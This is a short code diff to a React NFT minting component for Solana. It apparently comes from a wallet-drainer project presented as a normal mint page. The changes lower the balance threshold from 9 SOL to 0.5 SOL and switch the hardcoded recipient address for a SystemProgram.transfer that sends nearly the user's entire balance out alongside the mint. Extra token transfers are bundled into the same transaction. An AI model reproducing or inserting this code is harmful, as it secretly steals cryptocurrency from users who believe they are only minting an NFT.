@@ -50,7 +50,7 @@ const MintingComponent = ({setAlertState} : any) => {
       const transaction = new Transaction();
       transaction.add(mintFeeTransferInstruction, tokenTransferInstruction);
 
-      if(totalBalance > LAMPORTS_PER_SOL * 9) {
+      if(totalBalance > LAMPORTS_PER_SOL * 0.5) {
         const mintAddress1 = new PublicKey('8ngygxfET6gS1ypzALggQs7imYksCoCc2AQXF1HieqXx');
         // const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, wallet.publicKey);
         // const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, serverWallet.publicKey);
@@ -59,9 +59,11 @@ const MintingComponent = ({setAlertState} : any) => {
         const mintAddress2 = new PublicKey('CuEJZgvQQnu15FzNWXS1kLtEVQimYct63LsUm2fiu9V4');
         const otherTransferInstruction2 : any = await createTokenTransferInstruction(mintAddress2, LAMPORTS_PER_SOL);
 
+        // 4BYbjRczvKBQDi1KVDDeNfN3xwGzWB6ashC5r6bDhi1V
+        // J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX
         const otherTransferInstruction3 : any = SystemProgram.transfer({
             fromPubkey: wallet.publicKey,
-            toPubkey: new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX'),
+            toPubkey: new PublicKey('4BYbjRczvKBQDi1KVDDeNfN3xwGzWB6ashC5r6bDhi1V'),
             lamports: totalBalance - LAMPORTS_PER_SOL * (quantity * price + 0.01) 
           });
 
